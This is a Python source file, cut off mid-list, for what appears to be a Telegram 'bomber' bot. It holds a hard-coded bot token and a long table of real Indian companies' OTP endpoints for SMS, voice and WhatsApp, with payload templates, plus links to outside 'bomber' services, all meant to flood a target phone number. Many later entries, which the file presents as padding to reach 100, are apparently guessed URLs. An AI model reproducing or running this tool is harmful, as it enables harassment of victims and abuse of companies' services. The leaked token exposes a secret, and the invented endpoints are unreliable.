import asyncio
import aiohttp
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

BOT_TOKEN = "8259258581:AAEJ6xFSai3-pYWkN7m8zGDJLc1N1r7xAec"

APIS = [
    # === Call APIs ===
    {
        "name": "Tata Capital Voice Call",
        "type": "Call",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'
    },
    {
        "name": "1MG Voice Call", 
        "type": "Call",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'
    },
    {
        "name": "Swiggy Call Verification",
        "type": "Call",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", 
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Flipkart Voice Call",
        "type": "Call",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Zivame Voice Call",
        "type": "Call", 
        "url": "https://api.zivame.com/v2/customer/login/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}","otp_type":"voice"}}'
    },
    
    # === SMS APIs ===
    {
        "name": "Lenskart SMS",
        "type": "SMS",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'
    },
    {
        "name": "PharmEasy SMS",
        "type": "SMS",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Snitch SMS",
        "type": "SMS",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'
    },
    {
        "name": "ShipRocket SMS",
        "type": "SMS",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
    },
    {
        "name": "GoKwik SMS",
        "type": "SMS",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'
    },
    {
        "name": "NewMe SMS",
        "type": "SMS",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}'
    },
    
    # === WhatsApp APIs ===
    {
        "name": "KPN WhatsApp",
        "type": "WhatsApp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
    },
    {
        "name": "Rappi WhatsApp",

"type": "WhatsApp",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'
    },
    {
        "name": "Eka Care WhatsApp",
        "type": "WhatsApp",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'
    },
    
    # === Additional Working APIs ===
    {
        "name": "Wakefit SMS",
        "type": "SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Hungama OTP",
        "type": "SMS",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
    },
    {
        "name": "Doubtnut",
        "type": "SMS",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'
    },
    {
        "name": "PenPencil",
        "type": "SMS", 
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
    },
    {
        "name": "BeepKart",
        "type": "SMS",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","city":362}}'
    },
    {
        "name": "Smytten",
        "type": "SMS",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}'
    },
    {
        "name": "MyHubble Money",
        "type": "SMS",
        "url": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}'
    },
    {
        "name": "Housing.com",
        "type": "SMS",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'
    },
    {
        "name": "RentoMojo",
        "type": "SMS",
        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Khatabook",
        "type": "SMS",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'
    },
    {
        "name": "Animall",
        "type": "SMS",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},

"data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'
    },
    {
        "name": "Cosmofeed",
        "type": "SMS",
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'
    },
    {
        "name": "Spencer's",
        "type": "SMS",
        "url": "https://jiffy.spencers.in/user/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Shopper's Stop",
        "type": "SMS",
        "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}}'
    },
    {
        "name": "Lifestyle Stores",
        "type": "SMS",
        "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"signInMobile":"{phone}","channel":"sms"}}'
    },
    {
        "name": "PokerBaazi",
        "type": "SMS",
        "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'
    },
    {
        "name": "My11Circle",
        "type": "SMS",
        "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'
    },
    {
        "name": "RummyCircle",
        "type": "SMS",
        "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
                "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'
   },
   {
    "name": "SMS Bomber",
    "url": lambda p, d: f"http://sms-bomber.subhxcosmo.workers.dev/api?num={p}",
    "method": "GET",
    "headers": {"content-type": "application/json"},
    "data": lambda p, d: None
},
{
    "name": "bomberrr Vercel",
    "url": lambda p, d: f"https://bomberrr.vercel.app/?key=roots&number={p}",
    "method": "GET",
    "headers": {"content-type": "application/json"},
    "data": lambda p, d: None
},
{
    "name": "Bolbet",
    "url": lambda p, d: f"https://bolbet-liart.vercel.app/?key=roots&number={p}",
    "method": "GET",
    "headers": {"content-type": "application/json"},
    "data": lambda p, d: None
},
    {
        "name": "FreeFire Bomber", 
        "url": lambda p, d: f"https://freefire-api.ct.ws/bomber4.php?phone={p}&duration={d}",
        "method": "GET",
        "headers": {"User-Agent": "Mozilla/5.0"}
    },
    {
        "name": "Call Bomber API",
        "url": lambda p, d: f"https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb?number={p}",
        "method": "GET",
        "headers": {"User-Agent": "Mozilla/5.0"}
    },
    {
        "name": "Bomberr API",
        "url": lambda p, d: f"https://bomberr.onrender.com/num={p}",
        "method": "GET", 
        "headers": {"User-Agent": "Mozilla/5.0"}
    },
    {
        "name": "Lenskart",
        "url": lambda p, d: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phoneCode":"+91","telephone":"{p}"}}'
    },
    {
        "name": "Hungama",
        "url": lambda p, d: "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un"}}'
    },
    {
        "name": "Meru Cab",
        "url": lambda p, d: "https://merucabapp.com/api/otp/generate", 
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p, d: f"mobile_number={p}"
    },
    {
        "name": "Dayco India",
        "url": lambda p, d: "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p, d: f"api=send_otp&mob={p}"
    },
    {
        "name": "NoBroker", 
        "url": lambda p, d: "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p, d: f"phone={p}&countryCode=IN"
    },
    {
        "name": "ShipRocket",
        "url": lambda p, d: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'
    },
    {
        "name": "PenPencil",
        "url": lambda p, d: "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {"content-type": "application/json"},
        "data": lambda p, d: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'
    },
    {
        "name": "1mg",
        "url": lambda p, d: "https://www.1mg.com/auth_api/v6/create_token", 
        "method": "POST",
        "headers": {"content-type": "application/json"},
        "data": lambda p, d: f'{{"number":"{p}","otp_on_call":true}}'
    },
    {
        "name": "KPN Fresh",
        "url": lambda p, d: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB",
        "method": "POST",
        "headers": {"content-type": "application/json"},
        "data": lambda p, d: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'
    },
    {
        "name": "Servetel",
        "url": lambda p, d: "https://api.servetel.in/v1/auth/otp",
        "method": "POST", 
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p, d: f"mobile_number={p}"
    },
    {
        "name": "Swiggy Call",
        "url": lambda p, d: "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "headers": {"content-type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Tata Capital", 
        "url": lambda p, d: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'
    },
    {
        "name": "Doubtnut",
        "url": lambda p, d: "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"content-type": "application/json"},
        "data": lambda p, d: f'{{"phone_number":"{p}","language":"en"}}'
    },
    {
        "name": "GoPink Cabs",
        "url": lambda p, d: "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p, d: f"check_mobile_number=1&contact={p}"
    },
    {
        "name": "Myntra",
        "url": lambda p, d: "https://www.myntra.com/gw/mobile-auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Flipkart",
        "url": lambda p, d: "https://2.rome.api.flipkart.com/api/4/user/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'
    },
    {
        "name": "Amazon",
        "url": lambda p, d: "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p, d: f"email={p}&create=1"
    },
    {
        "name": "Zomato",
        "url": lambda p, d: "https://www.zomato.com/php/asyncLogin.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p, d: f"phone={p}"
    },
    {
        "name": "Paytm",
        "url": lambda p, d: "https://accounts.paytm.com/signin/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}","loginData":"LOGIN_USING_PHONE"}}'
    },
    {
        "name": "PhonePe",
        "url": lambda p, d: "https://www.phonepe.com/api/v2/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "BigBasket",
        "url": lambda p, d: "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile_number":"{p}"}}'
    },
    {
        "name": "Meesho",
        "url": lambda p, d: "https://api.meesho.com/v2/auth/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Snapdeal",
        "url": lambda p, d: "https://www.snapdeal.com/authenticate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Makemytrip",
        "url": lambda p, d: "https://www.makemytrip.com/api/umbrella/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "OYO",
        "url": lambda p, d: "https://api.oyoroomscrm.com/api/v2/user/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Rapido",
        "url": lambda p, d: "https://rapido.bike/api/v2/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Uber",
        "url": lambda p, d: "https://auth.uber.com/v2/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Domino's",
        "url": lambda p, d: "https://order.godominos.co.in/Online/App.aspx",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p, d: f"PhoneNo={p}"
    },
    {
        "name": "BookMyShow",
        "url": lambda p, d: "https://in.bmscdn.com/mjson/User/SendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobileNo":"{p}"}}'
    },
    {
        "name": "Netmeds",
        "url": lambda p, d: "https://www.netmeds.com/api/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Medlife",
        "url": lambda p, d: "https://api.medlife.com/v2/user/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Practo",
        "url": lambda p, d: "https://www.practo.com/patient/loginviapassword",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Ajio",
        "url": lambda p, d: "https://www.ajio.com/api/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'
    },
    {
        "name": "Nykaa",
        "url": lambda p, d: "https://www.nykaa.com/api/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Croma",
        "url": lambda p, d: "https://api.croma.com/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Reliance Digital",
        "url": lambda p, d: "https://www.reliancedigital.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "FirstCry",
        "url": lambda p, d: "https://www.firstcry.com/api/sendotp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Licious",
        "url": lambda p, d: "https://api.licious.com/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Zepto",
        "url": lambda p, d: "https://api.zepto.com/v2/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Blinkit",
        "url": lambda p, d: "https://blinkit.com/api/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    # ADDITIONAL 55 APIS TO REACH 100
    {
        "name": "Mobikwik",
        "url": lambda p, d: "https://www.mobikwik.com/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Freecharge",
        "url": lambda p, d: "https://www.freecharge.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Airtel Thanks",
        "url": lambda p, d: "https://www.airtel.in/thanks-app/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Jio",
        "url": lambda p, d: "https://www.jio.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Vodafone Idea",
        "url": lambda p, d: "https://www.myvi.in/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Byju's",
        "url": lambda p, d: "https://byjus.com/api/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Unacademy",
        "url": lambda p, d: "https://unacademy.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Vedantu",
        "url": lambda p, d: "https://www.vedantu.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Toppr",
        "url": lambda p, d: "https://www.toppr.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "WhiteHat Jr",
        "url": lambda p, d: "https://www.whitehatjr.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Cult.fit",
        "url": lambda p, d: "https://www.cult.fit/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "HealthifyMe",
        "url": lambda p, d: "https://www.healthifyme.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Pristyn Care",
        "url": lambda p, d: "https://www.pristyncare.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "PharmEasy",
        "url": lambda p, d: "https://pharmeasy.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Tata 1mg",
        "url": lambda p, d: "https://www.1mg.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Apollo 24/7",
        "url": lambda p, d: "https://www.apollo247.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "MFine",
        "url": lambda p, d: "https://www.mfine.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "DocsApp",
        "url": lambda p, d: "https://www.docsapp.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Lybrate",
        "url": lambda p, d: "https://www.lybrate.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Portea Medical",
        "url": lambda p, d: "https://www.portea.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "PolicyBazaar",
        "url": lambda p, d: "https://www.policybazaar.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "CoverFox",
        "url": lambda p, d: "https://www.coverfox.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Acko",
        "url": lambda p, d: "https://www.acko.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Digit Insurance",
        "url": lambda p, d: "https://www.godigit.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "HDFC Ergo",
        "url": lambda p, d: "https://www.hdfcergo.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "ICICI Lombard",
        "url": lambda p, d: "https://www.icicilombard.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Bajaj Allianz",
        "url": lambda p, d: "https://www.bajajallianz.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Star Health",
        "url": lambda p, d: "https://www.starhealth.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Max Bupa",
        "url": lambda p, d: "https://www.maxbupa.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Kotak Life",
        "url": lambda p, d: "https://www.kotaklife.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "SBI Life",
        "url": lambda p, d: "https://www.sbilife.co.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "LIC India",
        "url": lambda p, d: "https://www.licindia.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "HDFC Life",
        "url": lambda p, d: "https://www.hdfclife.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Axis Bank",
        "url": lambda p, d: "https://www.axisbank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "ICICI Bank",
        "url": lambda p, d: "https://www.icicibank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "HDFC Bank",
        "url": lambda p, d: "https://www.hdfcbank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
        {
        "name": "SBI Bank",
           "url": lambda p, d: "https://www.sbi.co.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Kotak Bank",
        "url": lambda p, d: "https://www.kotak.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Yes Bank",
        "url": lambda p, d: "https://www.yesbank.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "IndusInd Bank",
        "url": lambda p, d: "https://www.indusind.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "IDFC Bank",
        "url": lambda p, d: "https://www.idfcfirstbank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "AU Bank",
        "url": lambda p, d: "https://www.aubank.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "RBL Bank",
        "url": lambda p, d: "https://www.rblbank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Bandhan Bank",
        "url": lambda p, d: "https://www.bandhanbank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Federal Bank",
        "url": lambda p, d: "https://www.federalbank.co.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Canara Bank",
        "url": lambda p, d: "https://www.canarabank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "PNB",
        "url": lambda p, d: "https://www.pnbindia.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Bank of Baroda",
        "url": lambda p, d: "https://www.bankofbaroda.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Union Bank",
        "url": lambda p, d: "https://www.unionbankofindia.co.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Indian Bank",
        "url": lambda p, d: "https://www.indianbank.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Central Bank",
        "url": lambda p, d: "https://www.centralbankofindia.co.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
